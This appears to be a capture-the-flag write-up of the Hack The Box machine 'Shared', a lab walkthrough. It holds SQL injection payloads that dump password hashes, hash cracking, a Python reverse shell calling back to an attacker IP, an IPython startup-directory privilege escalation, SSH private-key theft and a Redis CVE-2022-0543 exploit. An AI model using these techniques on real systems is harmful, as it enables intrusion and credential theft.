# Shared

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```bash
$ export IP=10.10.11.172
$ echo $IP
10.10.11.172
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```bash
$ ping $IP
PING 10.10.11.172 (10.10.11.172) 56(84) bytes of data.
64 bytes from 10.10.11.172: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.11.172: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.11.172: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.11.172: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```bash
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

After the scan is complete, here's the result:

```bash
Nmap scan report for 10.10.11.172
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Issuer: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-20T13:37:14
| Not valid after:  2042-03-15T13:37:14
| MD5:   fb0b 4ab4 9ee7 d95d ae43 239a fca4 c59e
|_SHA-1: 6ccd a103 5d29 a441 0aa2 0e32 79c4 83e1 750a d0a0
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_http-title: Did not follow redirect to https://shared.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals the domain name of the web application `shared.htb` so I added it to my `/etc/hosts` file and started navigating around the web application, first thing I noted it's running [PrestaShop](https://www.prestashop.com/), with a quick google search I found that it's vulnerable to an RCE exploit, found this [article](https://build.prestashop-project.org/news/major-security-vulnerability-on-prestashop-websites/) and this [article](https://www.bleepingcomputer.com/news/security/hackers-exploited-prestashop-zero-day-to-breach-online-stores/)

I also started a subdomain fuzz using `wfuzz`:

```bash
└─$ sudo wfuzz -c -f subFuzz -Z -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://shared.htb' -H 'Host: FUZZ.shared.htb' --hw 11
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shared.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000001:   302        0 L      0 W        0 Ch        "www"                                                                                       
000000978:   200        64 L     151 W      3229 Ch     "checkout"                                                                                  

Total time: 1564.419
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 63.92148
```

And found `checkout.shared.htb` subdomain, also I already found this subdomain while exploring the web application, when trying to proceed to the checkout process it redirected me to that subdomain, so I intercepted the request to investigate the data being sent using `Burp Suite` and found a cookie being added in the form of `{"PRODUCT NAME": quantity"}`, SQL Injection? since I already know it's running MySQL database using [Wappalyzer](https://www.wappalyzer.com/), might be where it starts.

![Burp Suite Data Investigation](https://imgur.com/4j5NT6c.png)

---

## SQLi

Using [this](https://github.com/payloadbox/sql-injection-payload-list) list of SQLi payloads, I managed to inject an SQL query into that cookie value and return database info and It's [MariaDB](https://mariadb.org/) version 10.5.15, the SQLi query is : `'UNION ALL SELECT 1,@@version,3#`.

![SQLi Using Burp Suite](https://imgur.com/qzsHfxa.png)

Here are the queries I used to gather information from the database:

```sql
# BASE SQLI
'UNION ALL SELECT 1,2,3 #
```
```sql
# GET DB VERSION:
'UNION ALL SELECT 1,@@version,3#
```

> 10.5.15-MariaDB-0+deb11u1

```sql
# GET TABLE NAMES:
'UNION ALL SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables #
```


> ... A LOT OF TABLES ...
> ...
> user
> product


```sql
# GET COLUMNS OF TABLE user
'UNION ALL SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='user' #
```

> id,username,password

```sql
# GET USER DATA:
'UNION ALL SELECT 1, GROUP_CONCAT(id,username,password) ,3 FROM user #
```

> 1, james_mason, fc895d4eddc2fc12f995e18c865cf273

Credentials, according to the `nmap` scan, there's port 22 open which is OpenSSH, I tried to connect to the SSH using these creds after I cracked the password using `John The Ripper` tool using `Rockyou.txt` wordlist:

```bash
└─$ echo "fc895d4eddc2fc12f995e18c865cf273" > jamesmasonhash

└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt jamesmasonhash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Soleil101        (?)     
1g 0:00:00:00 DONE (2022-09-26 13:00) 1.754g/s 3668Kp/s 3668Kc/s 3668KC/s Sportster1..SoccerBabe
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Credentials are: `james_mason:Soleil101`, time for SSH:

```bash
└─$ ssh james_mason@$IP       
The authenticity of host '10.10.11.172 (10.10.11.172)' can't be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.172' (ED25519) to the list of known hosts.
james_mason@10.10.11.172's password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$ 
```

I'm in! but the user flag belongs to a user `dan_smiths`, so I'll have to somehow make a horizontal privilege escalation. I've never done this before so I like this machine already.

---

## Horizontal Privilege Escalation

First few steps into the machine as `james_mason` I executed some commands to identify the environment and my privileges:

```bash
james_mason@shared:~$ ls
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
james_mason@shared:~$ groups
james_mason developer
james_mason@shared:~$ sudo -l
-bash: sudo: command not found
james_mason@shared:~$ ss -tulpn
Netid          State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process          
udp            UNCONN          0               0                                0.0.0.0:68                            0.0.0.0:*                              
tcp            LISTEN          0               128                              0.0.0.0:22                            0.0.0.0:*                              
tcp            LISTEN          0               511                              0.0.0.0:443                           0.0.0.0:*                              
tcp            LISTEN          0               80                             127.0.0.1:3306                          0.0.0.0:*                              
tcp            LISTEN          0               511                            127.0.0.1:6379                          0.0.0.0:*                              
tcp            LISTEN          0               511                              0.0.0.0:80                            0.0.0.0:*                              
tcp            LISTEN          0               128                                 [::]:22                               [::]:*                              
james_mason@shared:~$ 

```

I found that `port 3306` and that's `mysql`, also `port 6379` and after some googling I found that it's running [Redis](https://redis.io/).

I kept cruising around the file system and I found these credentials that belong to a database:

```bash
james_mason@shared:/var/www/checkout.shared.htb/config$ ls
db.php
james_mason@shared:/var/www/checkout.shared.htb/config$ cat db.php
<?php
define('DBHOST','localhost');
define('DBUSER','checkout');
define('DBPWD','a54$K_M4?DdT^HUk');
define('DBNAME','checkout');
?>
james_mason@shared:/var/www/checkout.shared.htb/config$ 
```

I used these creds to connect to the MariaDB database:

```bash
james_mason@shared:/var/www/checkout.shared.htb/config$ mysql -h localhost -u checkout -p checkout
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9295
Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [checkout]> 
```

But there's nothing really new here:

```bash
MariaDB [checkout]> show databases;
+--------------------+
| Database           |
+--------------------+
| checkout           |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [checkout]> show tables;
+--------------------+
| Tables_in_checkout |
+--------------------+
| product            |
| user               |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [checkout]> select * from product;
+----+----------+-------+
| id | code     | price |
+----+----------+-------+
|  1 | 53GG2EF8 | 23.90 |
|  2 | YCS98E4A | 35.90 |
|  3 | CRAAFTKP | 29.00 |
|  4 | MFDSVHXQ | 29.00 |
|  5 | SS5UMYLB | 29.00 |
|  6 | 7DA8SKYP | 11.90 |
|  7 | 2E6E8GXJ | 11.90 |
|  8 | 562XZDU8 | 11.90 |
|  9 | DW64K6JF | 18.90 |
| 10 | B4GTLMT3 | 18.90 |
| 11 | B4ATAMB4 | 18.90 |
| 12 | 4HAR4XDK |  9.00 |
| 13 | UE593T4N |  9.00 |
| 14 | WH82F998 |  9.00 |
| 15 | PPZV67J5 | 35.00 |
| 16 | BTAPXNX4 | 12.90 |
| 17 | 5P6UG55R | 12.90 |
| 18 | 77W6QWLX | 12.90 |
| 19 | 8LPULR6Q | 13.90 |
+----+----------+-------+
19 rows in set (0.000 sec)

MariaDB [checkout]> select * from user;
+----+-------------+----------------------------------+
| id | username    | password                         |
+----+-------------+----------------------------------+
|  1 | james_mason | fc895d4eddc2fc12f995e18c865cf273 |
+----+-------------+----------------------------------+
1 row in set (0.000 sec)

MariaDB [checkout]> 
```

At this point I just transferred `linpeas.sh` and `pspy64` to this machine to check if there's any other running process I can use to escalate my privs. I immediately notice that user with the id "1001" which is `dan_smith` periodically running these commands:

```bash
2022/09/26 14:07:01 CMD: UID=1001 PID=5727   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/09/26 14:07:01 CMD: UID=1001 PID=5728   | /usr/bin/pkill ipython 
2022/09/26 14:07:01 CMD: UID=0    PID=5729   | /usr/sbin/CRON -f 
2022/09/26 14:07:01 CMD: UID=1001 PID=5730   | /usr/bin/python3 /usr/local/bin/ipython 
```

After some googling about `ipython` I found a vulnerability where I can execute commands on behalf of another user, it can be found on [this](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) github page.

So the steps are:

1. Craft a reverse shell python payload
2. Start a listener
3. Plant it in the directory where the user `dan_smith` will execute it
4. BINGO

So i started by making a reverse shell in `payload.py`:

```bash
#!/usr/bin/env python3

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.5",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("bash")
```

Started a Netcat listener:

```bash
└─$ sudo nc -lvnp 1337                       
[sudo] password for kali: 
listening on [any] 1337 ...
```

Then on the target machine, I navigated to `/opt/scripts_review`, and since the script is being executed periodically, I wanted to set everything up quickly before it resets, because when it does, all directories I made will be removed, I prepared and execute the following command:

```bash
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default && mkdir -m 777 profile_default/startup && cd profile_default/startup && wget http://10.10.16.5/payload.py
```

That's it! got the reverse shell and the user flag! also got the rsa ID for an SSH connection for later work.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1337                                                             
[sudo] password for kali: 
listening on [any] 1337 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.172] 48658
dan_smith@shared:/opt/scripts_review$ whoami
whoami
dan_smith
dan_smith@shared:/opt/scripts_review$ cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
...
```

SSH:

```bash
┌──(kali㉿kali)-[~]
└─$ chmod 600 dansmithrsakey 
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ ssh dan_smith@$IP -i dansmithrsakey 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~$ cat user.txt
*******************************r
...
```

---

## Vertical Privilege Escalation

Now it's time to escalate my privs from `dat_smith` to `root`, and earlier while I was using `pspy` I found the following processes being run by `root`:

```bash
2022/09/26 14:41:01 CMD: UID=0    PID=6813   | /bin/sh -c /root/c.sh 
2022/09/26 14:41:01 CMD: UID=0    PID=6814   | /bin/bash /root/c.sh 
2022/09/26 14:41:06 CMD: UID=0    PID=6817   | /bin/bash /root/c.sh 
2022/09/26 14:41:06 CMD: UID=0    PID=6819   | perl -ne s/\((\d+)\)/print " $1"/ge 
2022/09/26 14:41:06 CMD: UID=0    PID=6818   | /bin/bash /root/c.sh 
2022/09/26 14:41:06 CMD: UID=0    PID=6820   | pidof redis-server 
2022/09/26 14:41:06 CMD: UID=0    PID=6823   | /sbin/init 
```

Maybe it's time to utilise the Redis database, but first I searched for files I have access to as `dan_smith`:

```bash
dan_smith@shared:~$ groups
dan_smith developer sysadmin
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
```

I transfered this `redis_connector_dev` binary to my host machine and started reverse engineering it.

```bash
┌──(kali㉿kali)-[~]
└─$ file redis_connector_dev 
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ checksec redis_connector_dev 
[*] '/home/kali/CTF/HTB-CTF/Machines/Shared/redis_connector_dev'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

After some time using `strings`, `Ghidra` and some `gdb` but I couldn't get to anything useful, just a lot of gibberish and things I might not understand, so I decided to just run the binary on my kali machine and see where it goes:

```bash
└─$ ./redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
 dial tcp [::1]:6379: connect: connection refused
```

So it's trying to read port `6379` on my local host, so I started a `Netcat` listener to see what it's saying:

```bash
└─$ sudo nc -lvnp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52114
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

And I got the auth password for `Redis`! I went ahead and tried this password `F2WHqJUz2WEz=Gqq` on `redis-cli` and it worked:

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> 
```

I tried to poke around but didn't get anything useful, so I started googling until I found [CVE-2022-0543
](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0543) and looking further into it I found a python [script](https://github.com/aodsec/CVE-2022-0543) that crafts the payload and automates the process. I downloaded it and modfied the script to work with authenticated connection as following:

```python
	# On line 20:
	r  =  redis.Redis(host = ip,port = port, password = "F2WHqJUz2WEz=Gqq")
```

And since port `6379` isn't open on the local network, I used `chisel` to port forward:

```shell
		# On my kali machine:
└─$ sudo chisel server -p 1337 --reverse

		# On the target machine:
dan_smith@shared:~$ ./chisel client 10.10.16.5:1337 R:6379:127.0.0.1:6379
```

Then I ran `exploit.py`, got RCE and got the root flag!

```bash
└─$ python exploit.py    
  
      [#] Create By ::
        _                     _    ___   __   ____                             
       / \   _ __   __ _  ___| |  / _ \ / _| |  _ \  ___ _ __ ___   ___  _ __  
      / _ \ | '_ \ / _` |/ _ \ | | | | | |_  | | | |/ _ \ '_ ` _ \ / _ \| '_ \ 
     / ___ \| | | | (_| |  __/ | | |_| |  _| | |_| |  __/ | | | | | (_) | | | |
    /_/   \_\_| |_|\__, |\___|_|  \___/|_|   |____/ \___|_| |_| |_|\___/|_| |_|
                   |___/            By https://aodsec.com                                           
    
Please input redis ip:
>>127.0.0.1
Please input redis port:
>>6379
input exec cmd:(q->exit)
>>cat /root/root.txt
b'*******************************d\n'
input exec cmd:(q->exit)
>>
```

---
